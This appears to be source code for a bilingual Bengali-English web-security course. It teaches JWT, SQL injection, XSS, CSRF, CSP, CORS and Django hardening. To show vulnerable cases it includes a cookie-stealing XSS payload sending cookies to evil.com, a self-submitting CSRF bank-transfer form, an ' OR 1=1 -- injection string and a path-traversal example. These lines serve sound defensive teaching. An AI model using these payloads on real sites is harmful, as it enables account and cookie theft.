<div class="svg-caption">চিত্র: JWT — header.payload.signature। Payload এনক্রিপ্টেড নয়, শুধু signature গোপন।</div>

<div class="secret-box">🎫 <strong>JWT = স্টেটলেস টোকেন। তিন অংশ। signature গোপন।</strong> সার্ভার মনে রাখে না, টোকেন নিজেই পরিচয়। কিন্তু পরিচয় ছাড়াও একটি বিপদ — কেউ ক্ষতিকর ইনপুট পাঠালে? SQL injection, XSS? সেই প্রতিরোধ — পরের দরজায়।</div>`,
  senior: {
    title: "JWT vs Session এক নজরে",
    body: `<table class="kv-table"><tr><th>ধারণা</th><th>বিবরণ</th></tr>
<tr><td class="hl">Session</td><td>সার্ভারে state — স্টেটফুল</td></tr>
<tr><td class="hl">JWT (2015)</td><td>ক্লায়েন্টে — স্টেটলেস</td></tr>
<tr><td class="hl">header.payload.signature</td><td>তিন base64 অংশ</td></tr>
<tr><td class="hl">HS256</td><td>HMAC-SHA256 — symmetric</td></tr>
<tr><td class="hl">RS256</td><td>RSA-SHA256 — asymmetric</td></tr>
<tr><td class="hl">⚠️ alg=none</td><td>Attack — সর্বদা algorithms নির্দিষ্ট করো</td></tr>
<tr><td class="hl">Refresh Token</td><td>দীর্ঘ মেয়াদী — access token রিনিউ</td></tr></table>`
  }
});

doors.push({
  num: 8,
  icon: "⚔️",
  color: "#dc2626",
  name: "ইনজেকশনের বিষ",
  subtitle: "The Poison of Injection",
  tech: "OWASP Injection — SQL injection, XSS, CSRF, command injection, parameterized queries, CSP",
  spirit: "ফিতনা — বিপর্যয়, বিশ্বাসঘাতক ইনপুট",
  secret: "Injection = বিশ্বাসঘাতক ইনপুট। সমাধান: কখনো ইনপুটকে কোড হিসেবে ব্যাখ্যা করো না। Parameterized query, escaped output, CSP header — সব ইনপুট শত্রু।",
  recall: {
    q: " SQL injection কী? কীভাবে প্রতিরোধ করা যায়?",
    qen: "What is SQL injection? How to prevent it?",
    a: "অ্যাটাকার SQL কোড ইনপুট করে। ' OR 1=1 -- → সব রো ফেরত। প্রতিরোধ: parameterized query (cursor.execute(sql, params))। কখনো f-string বা string concatenation নয়।",
    aen: "Attacker inputs SQL code. ' OR 1=1 -- → all rows. Prevent: parameterized queries. Never f-string or concatenation."
  },
  story: `<p class="scene-setting">রুকাইয়া (Door ৭) তোমাকে JWT শিখিয়েছেন। কিন্তু পরিচয় ছাড়াও একটি বিপদ — কেউ ক্ষতিকর ইনপুট পাঠালে। "admin' OR 1=1 --" — এই সহজ স্ট্রিং পুরো ডেটাবেস খুলে দিতে পারে! এটাই injection — ইনপুটকে কোড হিসেবে ব্যাখ্যা করা। OWASP Top 10-এ #৩।</p>
<p class="scene-setting en">Rukayya (Door 7) taught you JWT. But beyond identity — a danger: someone sends malicious input. "admin' OR 1=1 --" — this simple string can open the entire database! This is injection — interpreting input as code. OWASP Top 10 #3.</p>

<div class="dialogue"><strong>প্রাচীর-রক্ষক আনাস:</strong> তিন ধরনের injection: SQL (ডেটাবেস), XSS (ব্রাউজার), CSRF (ক্রিয়া)। SQL: raw query তে ইনপুট যোগ করো না — parameterized query ব্যবহার করো। XSS: HTML-এ raw ইনপুট দেখিও না — escape করো। CSRF: প্রতিটি POST-এ token দাও। একটাই নিয়ম: সব ইনপুট শত্রু — যাচাই ছাড়া বিশ্বাস করো না।</div>
<div class="dialogue en"><strong>Wall Guardian Anas:</strong> Three types of injection: SQL (database), XSS (browser), CSRF (action). SQL: never add input to raw query — use parameterized queries. XSS: never show raw input in HTML — escape. CSRF: give token on every POST. One rule: all input is hostile — don't trust without verification.</div>

<div class="code-block"># ── STEP 1: What is injection? ──
# INJECTION = attacker puts MALICIOUS CODE into your application.
# The #1 security risk (OWASP Top 10).

# TYPES OF INJECTION:
injection_types = {
    "SQL Injection": "Malicious SQL in input fields",
    "XSS (Cross-Site Scripting)": "Malicious JavaScript in web pages",
    "Command Injection": "Malicious OS commands via input",
    "LDAP Injection": "Malicious LDAP queries",
    "NoSQL Injection": "Malicious MongoDB queries",
    "Template Injection": "Malicious template code (SSTI)",
}

print("INJECTION TYPES:")
for itype, desc in injection_types.items():
    print(f"  {itype}: {desc}")

# THE ROOT CAUSE: mixing CODE with DATA.
# If user input is treated as CODE, they can inject anything.
# Solution: ALWAYS separate code from data (parameterized queries, escaping).</div>

<div class="code-block"># ── STEP 2: SQL injection ──
# The most dangerous injection type.

# ❌ VULNERABLE (string concatenation):
vulnerable = """
user_input = "admin' OR 1=1 --"  # attacker input
query = f"SELECT * FROM users WHERE name = '{user_input}'"
# Becomes: SELECT * FROM users WHERE name = 'admin' OR 1=1 --'
# Result: returns ALL users! (1=1 is always true)
"""

print("❌ VULNERABLE:")
print(vulnerable)

# ✅ SAFE (parameterized query):
safe = """
# Django ORM (automatically safe):
User.objects.filter(name=user_input)  # parameterized internally

# Raw SQL with parameters:
cursor.execute(
    "SELECT * FROM users WHERE name = %s",
    [user_input]  # treated as DATA, not code
)
# The database KNOWS %s is data, not SQL syntax.
# Even if input contains SQL, it's treated as a string literal.
"""

print("✅ SAFE:")
print(safe)

# WHY PARAMETERIZED QUERIES WORK:
# The database PREPARES the query template first:
# SELECT * FROM users WHERE name = ?
# Then BINDS the parameter (user_input) as a STRING VALUE.
# No matter what the input contains, it's just a string — never executed as SQL.</div>

<div class="code-block"># ── STEP 3: XSS (Cross-Site Scripting) ──
# Attacker injects JavaScript that runs in other users' browsers.

# ❌ VULNERABLE:
vulnerable_xss = """
# User input directly in HTML:
return f"<h1>Hello {user_input}</h1>"

# If user_input = "<script>document.location='http://evil.com/?cookie='+document.cookie</script>"
# → Every visitor's cookies get stolen!
"""

print("❌ VULNERABLE XSS:")
print(vulnerable_xss)

# ✅ SAFE approaches:
safe_xss = """
# 1. Django templates AUTO-ESCAPE by default:
{{ user_input }}
# < becomes &lt;, > becomes &gt;
# Script tags become visible text, not executed

# 2. Content-Security-Policy header:
Content-Security-Policy: script-src 'self' 'nonce-abc123'
# Only allows scripts from same origin or with matching nonce

# 3. If you MUST output HTML (rich text), sanitize:
import bleach
clean_html = bleach.clean(user_html, tags=['b', 'i', 'a'], attributes={'a': ['href']})

# 4. NEVER use |safe filter on untrusted input!
# {{ user_input|safe }}  ← DANGEROUS!
"""

print("✅ SAFE XSS PREVENTION:")
print(safe_xss)

# XSS TYPES:
xss_types = {
    "Stored XSS": "Malicious script stored in database, shown to all users",
    "Reflected XSS": "Script in URL, reflected back by server",
    "DOM XSS": "Script executed by client-side JavaScript (no server involved)",
}

print("XSS TYPES:")
for xtype, desc in xss_types.items():
    print(f"  {xtype}: {desc}")</div>

<div class="code-block"># ── STEP 4: CSRF (Cross-Site Request Forgery) ──
# Attacker tricks user into submitting a form to YOUR site.

# HOW CSRF WORKS:
csrf_attack = """
1. User is logged into your bank (has session cookie)
2. User visits evil.com
3. evil.com has a hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="attacker">
     <input type="hidden" name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
4. Browser sends the form WITH the user's session cookie
5. Bank processes the transfer!

The user never INTENDED to make the transfer.
The cookie was sent automatically by the browser.
"""

print("CSRF ATTACK:")
print(csrf_attack)

# CSRF PREVENTION (Django does this by default):
csrf_prevention = """
# Django CSRF token:
# 1. Server generates random token, stores in session + cookie
# 2. Every form includes hidden token:
   {% csrf_token %}
   <input type="hidden" name="csrfmiddlewaretoken" value="abc123">

# 3. On POST/PUT/DELETE, Django verifies token matches
# 4. Evil.com doesn't know the token → request rejected!

# For APIs (no form):
# Use SameSite cookies: Set-Cookie: session=xxx; SameSite=Strict
# Or require custom header (X-Requested-With) that CORS blocks
"""

print("CSRF PREVENTION:")
print(csrf_prevention)

# DJANGO CSRF IS AUTOMATIC:
# - CsrfViewMiddleware is enabled by default
# - All {% csrf_token %} in templates
# - AJAX requests need X-CSRFToken header
# - APIs using JWT don't need CSRF (no cookies)</div>

<div class="code-block"># ── STEP 5: Other common web vulnerabilities ──
vulnerabilities = {
    "IDOR (Insecure Direct Object Reference)": {
        "what": "User accesses other users' data by changing URL /user/42 → /user/43",
        "fix": "Check ownership/permissions on every object access",
    },
    "SSRF (Server-Side Request Forgery)": {
        "what": "Attacker makes server send requests to internal services",
        "fix": "Whitelist allowed URLs, block internal IPs",
    },
    "Path Traversal": {
        "what": "../../../etc/passwd — access files outside web root",
        "fix": "Use safe file APIs, validate paths, never trust filenames",
    },
    "File Upload": {
        "what": "Upload malicious file (PHP shell, executable)",
        "fix": "Validate type, rename, store outside webroot, scan",
    },
    "Mass Assignment": {
        "what": "User sends extra fields (is_admin=true) in form data",
        "fix": "Use forms/serializers with explicit field lists",
    },
    "Open Redirect": {
        "what": "redirect_url parameter can point to evil.com",
        "fix": "Validate redirect URLs against whitelist",
    },
    "Deserialization": {
        "what": "Untrusted data deserialized → code execution",
        "fix": "Never use pickle/eval on untrusted data. Use JSON.",
    },
    "Race Conditions": {
        "what": "Two requests race → double-spend, duplicate actions",
        "fix": "Use transactions, locks, idempotency keys",
    },
}

print("COMMON WEB VULNERABILITIES:")
for vuln, info in vulnerabilities.items():
    print(f"\n  {vuln}:")
    print(f"    What: {info['what']}")
    print(f"    Fix: {info['fix']}")</div>

<div class="code-block"># ── STEP 6: Security checklist for your applications ──
# THE ULTIMATE WEB SECURITY CHECKLIST:

checklist = {
    "Input Validation": [
        "Validate ALL input (server-side, not just client)",
        "Use parameterized queries (never string concatenation)",
        "Sanitize HTML output (Django auto-escapes)",
        "Validate file uploads (type, size, content)",
    ],
    "Authentication": [
        "Use HTTPS everywhere (no HTTP)",
        "Strong password hashing (Argon2/bcrypt)",
        "Rate limiting on login",
        "MFA for sensitive operations",
    ],
    "Session Management": [
        "Secure cookies (HttpOnly, Secure, SameSite)",
        "Session timeout",
        "Regenerate session ID after login",
        "CSRF tokens on all state-changing operations",
    ],
    "Authorization": [
        "Check permissions on EVERY request",
        "Principle of least privilege",
        "Separate admin and user roles",
        "Object-level permissions (IDOR prevention)",
    ],
    "Configuration": [
        "Debug mode OFF in production",
        "Secret keys from environment (not in code)",
        "Security headers (HSTS, CSP, X-Frame-Options)",
        "Keep dependencies updated",
    ],
    "Monitoring": [
        "Log security events (login, access denied)",
        "Alert on suspicious activity",
        "Regular security scans (OWASP ZAP)",
        "Penetration testing",
    ],
}

print("WEB SECURITY CHECKLIST:")
for category, items in checklist.items():
    print(f"\n  {category}:")
    for item in items:
        print(f"    ☐ {item}")

# THE GOLDEN RULES:
# 1. NEVER trust user input (validate, sanitize, escape)
# 2. NEVER store secrets in code (use environment variables)
# 3. NEVER deploy with DEBUG=True
# 4. ALWAYS use HTTPS
# 5. ALWAYS use parameterized queries
# 6. ALWAYS check permissions
# 7. ALWAYS keep dependencies updated
# 8. ALWAYS log security events
# 9. ALWAYS test for common vulnerabilities
# 10. When in doubt, DENY access (fail secure, not fail open)

# "Security is not a product, it's a process." — Bruce Schneier
# You can't be 100% secure. But you can make it HARD ENOUGH
# that attackers move on to easier targets.</div>

<div class="verse">إِنَّ الَّذِينَ يَرْمُونَ الْمُحْصَنَاتِ الْغَافِلَاتِ الْمُؤْمِنَاتِ</div>
<div style="font-size:.85rem;color:var(--ink-dim);text-align:center;margin-bottom:1rem">"নিশ্চয়ই যারা অজ্ঞ নির্দোষ মুমিন নারীদের প্রতি অপবাদ দেয়..." — কুরআন ২৪:২৩</div>

<p class="scene-setting">ফিতনা — বিশৃঙ্খলা, বিশ্বাসঘাতকতা। Injection সেই ফিতনার ডিজিটাল রূপ। বিশ্বাস করা ইনপুটকে বিশ্বাসঘাতক কোডে রূপ দেওয়া। প্রতিরোধ: সব ইনপুট যাচাই করো — শত্রু হিসেবে ধরো। পরামর্শ: কখনো অপবাদ গ্রহণ করো না যাচাই ছাড়া।</p>
<p class="scene-setting en">Fitnah — chaos, betrayal. Injection is the digital form of that fitnah. Transforming trusted input into treacherous code. Prevention: verify all input — treat as hostile. Counsel: never accept accusation without verification.</p>

<div class="callout tip"><span class="co-icon">🔗</span><div><strong>Book ৪০ (Software Engineering) Door ৮ (Security):</strong> OWASP Top 10 সম্পূর্ণ তালিকা। Book ৩৯ (Databases) Door ৪ (SQL): parameterized query শিখেছিলে — এখন দেখো কেন।</div></div>

<div class="svg-diagram">
<svg viewBox="0 0 580 250" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto">
  <text x="290" y="25" text-anchor="middle" fill="#e2e8f0" font-size="13" font-weight="900">⚔️ Injection: SQL, XSS, CSRF</text>
  <rect x="20" y="55" width="160" height="80" rx="8" fill="#450a0a" stroke="#f87171" stroke-width="2"/>
  <text x="100" y="78" text-anchor="middle" fill="#fca5a5" font-size="9" font-weight="700">SQL Injection</text>
  <text x="100" y="98" text-anchor="middle" fill="#fca5a5" font-size="10">input: ' OR 1=1 --</text>
  <text x="100" y="112" text-anchor="middle" fill="#f87171" font-size="10">query: SELECT * WHERE</text>
  <text x="100" y="122" text-anchor="middle" fill="#f87171" font-size="10">name='' OR 1=1 --</text>
  <text x="100" y="140" text-anchor="middle" fill="#22c55e" font-size="10">Fix: parameterized query</text>
  <rect x="210" y="55" width="160" height="80" rx="8" fill="#451a0a" stroke="#fbbf24" stroke-width="2"/>
  <text x="290" y="78" text-anchor="middle" fill="#fcd34d" font-size="9" font-weight="700">XSS</text>
  <text x="290" y="98" text-anchor="middle" fill="#fcd34d" font-size="10">input: &lt;script&gt;steal()&lt;/script&gt;</text>
  <text x="290" y="112" text-anchor="middle" fill="#fbbf24" font-size="10">rendered in browser</text>
  <text x="290" y="122" text-anchor="middle" fill="#fbbf24" font-size="10">cookie stolen!</text>
  <text x="290" y="140" text-anchor="middle" fill="#22c55e" font-size="10">Fix: escape output, CSP</text>
  <rect x="400" y="55" width="160" height="80" rx="8" fill="#1e3a5f" stroke="#22d3ee" stroke-width="2"/>
  <text x="480" y="78" text-anchor="middle" fill="#7dd3fc" font-size="9" font-weight="700">CSRF</text>
  <text x="480" y="98" text-anchor="middle" fill="#7dd3fc" font-size="10">evil site sends POST</text>
  <text x="480" y="112" text-anchor="middle" fill="#22d3ee" font-size="10">browser adds cookie</text>
  <text x="480" y="122" text-anchor="middle" fill="#22d3ee" font-size="10">unauthorized action!</text>
  <text x="480" y="140" text-anchor="middle" fill="#22c55e" font-size="10">Fix: CSRF token</text>
  <rect x="100" y="160" width="380" height="60" rx="8" fill="#052e16" stroke="#22c55e" stroke-width="2"/>
  <text x="290" y="185" text-anchor="middle" fill="#4ade80" font-size="9" font-weight="700">Universal Defense</text>
  <text x="290" y="205" text-anchor="middle" fill="#86efac" font-size="10">Never trust input · Validate · Sanitize · Escape · Parameterize</text>
</svg>
</div>
<div class="svg-caption">চিত্র: SQL injection, XSS, CSRF — তিন রূপ। Fix: validate, escape, parameterize।</div>

<div class="secret-box">⚔️ <strong>Injection = বিশ্বাসঘাতক ইনপুট।</strong> SQL, XSS, CSRF — তিন রূপ। প্রতিরোধ: parameterized query, escaped output, CSRF token, CSP header। কিন্তু সবচেয়ে শক্তিশালী প্রতিরোধ কী? প্রতিটি অনুরোধকে শত্রু হিসেবে দেখা — সেই দর্শন — পরের দরজায়।</div>`,
  senior: {
    title: "Injection Attacks এক নজরে",
    body: `<table class="kv-table"><tr><th>আক্রমণ</th><th>প্রতিরোধ</th></tr>
<tr><td class="hl">SQL Injection</td><td>Parameterized query</td></tr>
<tr><td class="hl">XSS</td><td>Escape output + CSP</td></tr>
<tr><td class="hl">CSRF</td><td>CSRF token</td></tr>
<tr><td class="hl">Command Injection</td><td>Subprocess, not shell=True</td></tr>
<tr><td class="hl">LDAP Injection</td><td>Escape LDAP filter</td></tr>
<tr><td class="hl">Rule</td><td>সব ইনপুট শত্রু — যাচাই করো</td></tr></table>`
  }
});

doors.push({
  num: 9,
  icon: "🛡️",
  color: "#dc2626",
  name: "দরোয়ানের নিয়ম",
  subtitle: "The Bouncer's Rules",
  tech: "Web Security Defenses — CORS, CSP, rate limiting, WAF, security headers, HSTS",
  spirit: "হিমায়াহ — সুরক্ষা, প্রতিটি দরজায় প্রহরী",
  secret: "একটি অ্যাপ্লিকেশনে একাধিক প্রতিরক্ষা স্তর — CORS, CSP, rate limit, WAF। কোনো একটি ভাঙলে অন্যটি রক্ষা করে। Defense in depth।",
  recall: {
    q: " CORS কী? CSP কী? কেন দরকার?",
    qen: "What is CORS? What is CSP? Why are they needed?",
    a: "CORS = Cross-Origin Resource Sharing — কোন ডোমেইন থেকে API access পাবে। CSP = Content Security Policy — কোন script/style load হবে। XSS প্রতিরোধ।",
    aen: "CORS = which domains can access your API. CSP = which scripts/styles can load. Prevents XSS."
  },
  story: `<p class="scene-setting">আনাস (Door ৮) তোমাকে injection প্রতিরোধ শিখিয়েছেন। কিন্তু প্রতিরোধ শুধু injection-এ নয় — প্রতিটি স্তরে দরকার। CORS বলে কোন ডোমেইন তোমার API ডাকতে পারে। CSP বলে কোন script চলবে। Rate limit বলে কেউ একসাথে কতবার চেষ্টা করতে পারে। HSTS বলে সর্বদা HTTPS ব্যবহার করো। এগুলো দরোয়ান — প্রতিটি দরজায়।</p>
<p class="scene-setting en">Anas (Door 8) taught you injection prevention. But defense is not just injection — needed at every layer. CORS says which domains can call your API. CSP says which scripts run. Rate limit says how many attempts per time. HSTS says always use HTTPS. These are bouncers — at every door.</p>

<div class="dialogue"><strong>দরোয়ান-প্রধান ওমর:</strong> Defense in depth — একাধিক স্তর। কোনো একটি ভাঙলে অন্যটি রক্ষা করে। CORS: শুধু তোমার ডোমেইন থেকে API access। CSP: শুধু trusted script। Rate limit: ১০০ request/মিনিট। WAF: OWASP rules automatically। HSTS: HTTPS বাধ্যতামূলক। প্রতিটি স্তর একটি ঢাল।</div>
<div class="dialogue en"><strong>Chief Bouncer Umar:</strong> Defense in depth — multiple layers. If one breaks, another protects. CORS: only your domain accesses API. CSP: only trusted scripts. Rate limit: 100 req/min. WAF: OWASP rules automatically. HSTS: HTTPS mandatory. Each layer a shield.</div>

<div class="code-block"># ── STEP 1: HTTP security headers ──
# Security headers tell the browser how to protect users.

headers = {
    "Strict-Transport-Security (HSTS)": {
        "what": "Force HTTPS for all requests",
        "example": "max-age=31536000; includeSubDomains; preload",
        "prevents": "SSL stripping, downgrade attacks",
    },
    "Content-Security-Policy (CSP)": {
        "what": "Whitelist what resources can load (scripts, styles, images)",
        "example": "default-src 'self'; script-src 'self' 'nonce-abc'",
        "prevents": "XSS, data injection, unauthorized loading",
    },
    "X-Frame-Options": {
        "what": "Prevent page from being embedded in iframe",
        "example": "DENY or SAMEORIGIN",
        "prevents": "Clickjacking",
    },
    "X-Content-Type-Options": {
        "what": "Prevent browser from guessing file type (MIME sniffing)",
        "example": "nosniff",
        "prevents": "MIME confusion attacks",
    },
    "Referrer-Policy": {
        "what": "Control what referrer info is sent",
        "example": "strict-origin-when-cross-origin",
        "prevents": "Information leakage",
    },
    "Permissions-Policy": {
        "what": "Control browser features (camera, mic, geolocation)",
        "example": "camera=(), microphone=(), geolocation=()",
        "prevents": "Unauthorized feature access",
    },
}

print("HTTP SECURITY HEADERS:")
for header, info in headers.items():
    print(f"\n  {header}")
    print(f"    What: {info['what']}")
    print(f"    Example: {info['example']}")
    print(f"    Prevents: {info['prevents']}")</div>

<div class="code-block"># ── STEP 2: Content-Security-Policy (CSP) ──
# CSP is the MOST POWERFUL XSS defense.

# WITHOUT CSP: any script can execute (massive XSS risk)
# WITH CSP: only whitelisted scripts can execute

# CSP DIRECTIVES:
csp_directives = {
    "default-src": "Fallback for all resource types",
    "script-src": "Where JavaScript can come from",
    "style-src": "Where CSS can come from",
    "img-src": "Where images can come from",
    "font-src": "Where fonts can come from",
    "connect-src": "Where AJAX/WebSocket can connect",
    "frame-src": "Where iframes can come from",
    "object-src": "Where plugins (Flash, Java) can come from",
    "base-uri": "What <base> tag can be set to",
    "form-action": "Where forms can submit to",
}

print("CSP DIRECTIVES:")
for directive, desc in csp_directives.items():
    print(f"  {directive}: {desc}")

# CSP VALUES:
csp_values = {
    "'self'": "Same origin as the page",
    "'none'": "Nothing allowed",
    "'nonce-abc123'": "Only scripts with matching nonce attribute",
    "'sha256-...'": "Only scripts matching this hash",
    "https://cdn.example.com": "Specific domain",
    "https:": "Any HTTPS source (broad — less secure)",
    "*": "Anywhere (INSECURE — don't use!)",
}

print("\nCSP VALUES:")
for value, desc in csp_values.items():
    print(f"  {value}: {desc}")

# DJANGO CSP CONFIGURATION:
django_csp = """
# Install: pip install django-csp
# settings.py:
CSP_DEFAULT_SRC = ("'none'",)
CSP_SCRIPT_SRC = ("'self'", "'nonce-{nonce}'")
CSP_STYLE_SRC = ("'self'",)
CSP_IMG_SRC = ("'self'", "data:", "https:")
CSP_FONT_SRC = ("'self'",)
CSP_CONNECT_SRC = ("'self'",)
CSP_FRAME_ANCESTORS = ("'none'",)  # prevent framing
"""

print(django_csp)</div>

<div class="code-block"># ── STEP 3: CORS (Cross-Origin Resource Sharing) ──
# CORS controls which DOMAINS can access your API.

# THE SAME-ORIGIN POLICY:
# By default, browsers BLOCK cross-origin requests.
# Your-site.com CANNOT read data from api.other-site.com.
# This prevents malicious sites from stealing data.

# CORS relaxes this for TRUSTED origins:

# ❌ INSECURE (allow everyone):
insecure = """
Access-Control-Allow-Origin: *
# Any website can call your API!
"""
print("❌ INSECURE:")
print(insecure)

# ✅ SECURE (whitelist specific origins):
secure = """
Access-Control-Allow-Origin: https://your-frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true  # for cookies
"""
print("✅ SECURE:")
print(secure)

# DJANGO CORS:
django_cors = """
# Install: pip install django-cors-headers
# settings.py:
INSTALLED_APPS += ['corsheaders']
MIDDLEWARE = ['corsheaders.middleware.CorsMiddleware'] + MIDDLEWARE

CORS_ALLOWED_ORIGINS = [
    "https://your-frontend.com",
    "https://admin.your-frontend.com",
]
CORS_ALLOW_CREDENTIALS = True  # allow cookies

# For development only:
CORS_ALLOWED_ORIGINS += ["http://localhost:3000", "http://localhost:8080"]
"""

print(django_cors)</div>

<div class="code-block"># ── STEP 4: Rate limiting and DDoS protection ──
# Rate limiting prevents abuse by limiting requests per user/IP.

# DJANGO REST FRAMEWORK RATE LIMITING:
drf_throttle = """
# settings.py:
REST_FRAMEWORK = {
    'DEFAULT_THROTTLE_CLASSES': [
        'rest_framework.throttling.AnonRateThrottle',  # anonymous
        'rest_framework.throttling.UserRateThrottle',  # authenticated
        'rest_framework.throttling.ScopedRateThrottle',  # per-scope
    ],
    'DEFAULT_THROTTLE_RATES': {
        'anon': '100/day',      # anonymous: 100 requests/day
        'user': '1000/day',     # authenticated: 1000/day
        'login': '5/hour',      # login attempts: 5/hour
    }
}

# Per-view throttle:
from rest_framework.throttling import UserRateThrottle

class MyViewSet(viewsets.ModelViewSet):
    throttle_classes = [UserRateThrottle]
    throttle_scope = 'uploads'  # custom scope
"""

print(drf_throttle)

# DDoS PROTECTION (Distributed Denial of Service):
ddos_protection = {
    "Cloudflare": "CDN + WAF + DDoS protection (most popular)",
    "AWS WAF": "Web Application Firewall (AWS-native)",
    "nginx limit_req": "Rate limit at reverse proxy level",
    "fail2ban": "Ban IPs after repeated failures",
    "Redis-based": "Custom rate limiting with Redis counters",
}

print("DDoS PROTECTION TOOLS:")
for tool, desc in ddos_protection.items():
    print(f"  {tool}: {desc}")

# RATE LIMITING STRATEGIES:
strategies = {
    "Fixed Window": "X requests per time window (simple, bursts at edges)",
    "Sliding Window": "X requests in last N seconds (smooth)",
    "Token Bucket": "Tokens refill at rate R, each request uses 1 (smoothest)",
    "Leaky Bucket": "Requests queued, processed at fixed rate",
}

print("RATE LIMITING STRATEGIES:")
for strategy, desc in strategies.items():
    print(f"  {strategy}: {desc}")</div>

<div class="code-block"># ── STEP 5: Django security configuration ──
# Complete Django production security settings:

django_security_settings = """
# settings.py (production):

# HTTPS / TLS:
SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')

# Cookies:
SESSION_COOKIE_SECURE = True      # HTTPS only
SESSION_COOKIE_HTTPONLY = True    # no JavaScript access
SESSION_COOKIE_SAMESITE = 'Lax'   # CSRF protection
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SAMESITE = 'Lax'

# Headers:
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_BROWSER_XSS_FILTER = True
X_FRAME_OPTIONS = 'DENY'

# Debug:
DEBUG = False                     # NEVER True in production!

# Secrets:
SECRET_KEY = os.environ['SECRET_KEY']  # from environment!

# Allowed hosts:
ALLOWED_HOSTS = ['yourdomain.com', 'www.yourdomain.com']

# CORS:
CORS_ALLOWED_ORIGINS = ['https://yourdomain.com']
"""

print(django_security_settings)

# SECURITY AUDIT COMMANDS:
audit_commands = """
# Check security headers:
$ curl -sI https://yourdomain.com | grep -i security
# Should show: HSTS, CSP, X-Frame-Options, etc.

# Online security scanners:
# https://securityheaders.com (grade A+ target)
# https://www.ssllabs.com/ssltest/ (TLS grade A+)
# https://observatory.mozilla.org (comprehensive scan)

# Django check:
$ python manage.py check --deploy
# Reports security issues in your Django config
"""

print(audit_commands)</div>

<div class="code-block"># ── STEP 6: Security testing and monitoring ──
# HOW TO TEST YOUR SECURITY:

testing_tools = {
    "OWASP ZAP": "Free web app scanner (automated + manual)",
    "Burp Suite": "Professional web security testing",
    "nikto": "Web server scanner",
    "nmap": "Network/port scanner",
    "sqlmap": "SQL injection scanner",
    "npm audit / pip-audit": "Dependency vulnerability scan",
    "Snyk": "Continuous vulnerability monitoring",
    "SonarQube": "Code quality + security analysis",
}

print("SECURITY TESTING TOOLS:")
for tool, desc in testing_tools.items():
    print(f"  {tool}: {desc}")

# SECURITY MONITORING:
monitoring = {
    "Log security events": "Logins, failures, access denied, admin actions",
    "Alert on patterns": "Brute force (many failures), unusual access times",
    "Monitor dependencies": "CVE notifications for your packages",
    "Track security metrics": "Failed logins, blocked requests, vuln count",
    "Incident response plan": "What to do when breached (who, how, when)",
}

print("\nSECURITY MONITORING:")
for practice, desc in monitoring.items():
    print(f"  ☐ {practice}: {desc}")

# SECURITY CHECKLIST SUMMARY:
summary = """
LAYER 1 — Network:
  ✅ HTTPS everywhere (TLS 1.3, HSTS)
  ✅ Rate limiting (prevent DDoS)
  ✅ Firewall (only needed ports open)

LAYER 2 — Application:
  ✅ Input validation (all input is hostile)
  ✅ Parameterized queries (prevent SQL injection)
  ✅ Output escaping (prevent XSS)
  ✅ CSRF tokens (prevent CSRF)
  ✅ Security headers (CSP, HSTS, X-Frame-Options)

LAYER 3 — Authentication:
  ✅ Argon2 password hashing
  ✅ Rate limiting on login
  ✅ MFA for sensitive accounts
  ✅ Secure session management

LAYER 4 — Infrastructure:
  ✅ Docker security (non-root, read-only, limits)
  ✅ Network segmentation (VPC, security groups)
  ✅ Secrets management (KMS, Vault, not in code)
  ✅ Regular updates (OS, packages, frameworks)

LAYER 5 — Monitoring:
  ✅ Log all security events
  ✅ Alert on anomalies
  ✅ Regular security scans
  ✅ Incident response plan

DEFENSE IN DEPTH.
Each layer is independent. If one fails, others protect.
No single point of security failure.</div>

<div class="verse">وَاتَّخَذُوا مِن دُونِ اللَّهِ أَوْلِيَاءَ لَا يَحْفَظُونَهُمْ</div>
<div style="font-size:.85rem;color:var(--ink-dim);text-align:center;margin-bottom:1rem">"তারা আল্লাহকে ছেড়ে অভিভাবক নিয়েছে যারা তাদের রক্ষা করে না।" — কুরআন ৩৬:৩২</div>

<p class="scene-setting">হিমায়াহ — সুরক্ষা। প্রতিটি security header একটি প্রহরী। কিন্তু ভুল প্রহরী নিলে রক্ষা হয় না — "যারা রক্ষা করে না তাদের অভিভাবক বানিও না।" সঠিক defense বাছো — parameterized query, CORS whitelist, CSP nonce।</p>
<p class="scene-setting en">Himayah — protection. Each security header is a guardian. But a wrong guardian won't protect — "do not take as guardians those who cannot protect." Choose correct defense — parameterized queries, CORS whitelist, CSP nonce.</p>

<div class="callout tip"><span class="co-icon">🔗</span><div><strong>Book ৩৭ (Networks) Door ৯ (TLS):</strong> HSTS = HTTPS বাধ্যতামূলক। Book ৪৩ (Cloud DevOps) Door ৬: WAF ও Cloudflare। Book ৪০ (Software Engineering) Door ৮: OWASP Top 10।</div></div>

<div class="svg-diagram">
<svg viewBox="0 0 580 250" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto">
  <text x="290" y="25" text-anchor="middle" fill="#e2e8f0" font-size="13" font-weight="900">🛡️ Defense in Depth: Multiple Security Layers</text>
  <rect x="180" y="50" width="220" height="40" rx="20" fill="#450a0a" stroke="#f87171" stroke-width="2"/>
  <text x="290" y="75" text-anchor="middle" fill="#fca5a5" font-size="8">WAF (Web Application Firewall)</text>
  <rect x="160" y="95" width="260" height="40" rx="20" fill="#451a0a" stroke="#fbbf24" stroke-width="2"/>
  <text x="290" y="120" text-anchor="middle" fill="#fcd34d" font-size="8">Rate Limiting + CORS + CSP</text>
  <rect x="140" y="140" width="300" height="40" rx="20" fill="#1e3a5f" stroke="#22d3ee" stroke-width="2"/>
  <text x="290" y="165" text-anchor="middle" fill="#7dd3fc" font-size="8">Authentication (JWT) + Authorization (RBAC)</text>
  <rect x="120" y="185" width="340" height="40" rx="20" fill="#052e16" stroke="#22c55e" stroke-width="2"/>
  <text x="290" y="210" text-anchor="middle" fill="#4ade80" font-size="8">Input Validation + Parameterized Queries + Encryption</text>
  <text x="290" y="240" text-anchor="middle" fill="#94a3b8" font-size="10">Each layer independent — if one breaks, others hold</text>
</svg>
